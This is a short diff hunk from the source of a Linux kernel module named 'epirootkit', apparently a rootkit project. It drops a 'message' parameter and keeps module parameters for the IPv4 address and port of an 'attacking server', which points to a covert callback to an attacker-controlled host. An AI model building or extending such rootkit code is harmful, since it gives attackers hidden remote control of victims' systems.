@@ -6,15 +6,12 @@
 
 char *ip = SERVER_IP;
 int port = SERVER_PORT;
-char *message = CONNEXION_MESSAGE;
 
 module_param(ip, charp, 0644);
 module_param(port, int, 0644);
-module_param(message, charp, 0644);
 
 MODULE_PARM_DESC(ip, "IPv4 of attacking server");
 MODULE_PARM_DESC(port, "Port of attacking server");
-MODULE_PARM_DESC(message, "Message to send to the attacking server");
 
 /**
  * @brief Initializes the epirootkit module.
